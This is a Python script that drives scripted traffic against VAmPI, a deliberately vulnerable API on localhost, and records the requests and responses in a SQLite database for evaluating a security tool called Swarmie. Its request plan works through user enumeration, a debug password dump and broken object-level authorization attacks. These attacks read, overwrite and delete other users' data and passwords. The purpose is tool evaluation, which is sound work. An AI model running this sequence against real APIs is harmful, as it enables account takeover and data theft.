"""VAmPI traffic generator for the Swarmie A/B eval (modern REST API, JWT bearer).

An out-of-sample modern-API target Swarmie was never tuned against. Registers, logs in for a
JWT, then walks the vulnerable surface: user/email enumeration, the /_debug password dump,
BOLA on books/email/password, and a JWT-issuing login. Records each pair to a Capture-schema DB.

Usage: python3 -m eval.juiceshop.crawl_vampi --base http://localhost:5001 --out eval/juiceshop/vampi.db
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sqlite3
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit

_SCHEMA = """
CREATE TABLE http_traffic (
    request_id INTEGER PRIMARY KEY, timestamp TEXT, method TEXT, host TEXT,
    path TEXT, query TEXT, param_count INTEGER, param_names TEXT,
    status_code INTEGER, response_length INTEGER, content_type TEXT,
    extension TEXT, protocol TEXT, url TEXT, request_hash TEXT
);
CREATE TABLE http_messages (
    request_id INTEGER PRIMARY KEY, request_headers TEXT, request_body BLOB,
    response_headers TEXT, response_body BLOB
);
"""

_PLAN = [
    ("POST", "/users/v1/register", {"username": "evaluser", "password": "Eval123!", "email": "eval@eval.test"}, False),
    ("POST", "/users/v1/login", {"username": "evaluser", "password": "Eval123!"}, False),
    ("GET", "/users/v1", None, False),
    ("GET", "/users/v1/_debug", None, False),
    ("GET", "/users/v1/name1", None, False),
    ("GET", "/me", None, True),
    ("GET", "/books/v1", None, True),
    ("POST", "/books/v1", {"book_title": "evalbook", "secret": "TOPSECRET-eval-42"}, True),
    ("GET", "/books/v1/bookTitle53", None, True),
    ("GET", "/books/v1/evalbook", None, True),
    ("PUT", "/users/v1/name1/email", {"email": "pwned@eval.test"}, True),
    ("PUT", "/users/v1/name1/password", {"password": "pwned"}, True),
    ("DELETE", "/users/v1/name2", None, True),
]


def _hdrs(items):
    return "".join(f"{k}: {v}\r\n" for k, v in items)


def crawl(base, out):
    out = Path(out)
    if out.exists():
        out.unlink()
    out.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(out)
    conn.executescript(_SCHEMA)
    host = urlsplit(base).netloc
    token = ""
    rid = 0
    stats = {"rows": 0, "token": False, "statuses": {}}
    for method, path, body, need_auth in _PLAN:
        rid += 1
        url = base + path
        sp = urlsplit(url)
        headers = {"Accept": "application/json", "User-Agent": "swarmie-eval/1"}
        data = json.dumps(body).encode() if body is not None else None
        if data is not None:
            headers["Content-Type"] = "application/json"
        if need_auth and token:
            headers["Authorization"] = f"Bearer {token}"
        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                status, resp_headers, resp_body = r.status, dict(r.headers), r.read()
        except urllib.error.HTTPError as e:
            status, resp_headers, resp_body = e.code, dict(e.headers), e.read()
        except (urllib.error.URLError, TimeoutError) as e:
            status, resp_headers, resp_body = 0, {}, str(e).encode()
        if path == "/users/v1/login" and status == 200:
            try:
                token = json.loads(resp_body).get("auth_token", "")
                stats["token"] = bool(token)
            except (ValueError, AttributeError):
                pass
        req_hdr = _hdrs([("Host", host), ("Authorization", "Bearer <redacted>")] if (need_auth and token) else [("Host", host)])
        conn.execute("INSERT INTO http_traffic VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (
            rid, f"2026-08-30T02:10:{rid:02d}Z", method, host, sp.path, sp.query, 0, "", status,
            len(resp_body), resp_headers.get("Content-Type", ""), "", "HTTP/1.1", url,
            hashlib.sha256(f"{method} {url}".encode()).hexdigest()))
        conn.execute("INSERT INTO http_messages VALUES (?,?,?,?,?)", (
            rid, req_hdr, data or b"", _hdrs(resp_headers.items()), resp_body))
        stats["rows"] += 1
        stats["statuses"][str(status)] = stats["statuses"].get(str(status), 0) + 1
    conn.commit()
    conn.close()
    return stats


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:5001")
    ap.add_argument("--out", default="eval/juiceshop/vampi.db")
    args = ap.parse_args(argv)
    print(json.dumps({"db": args.out, **crawl(args.base, args.out)}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
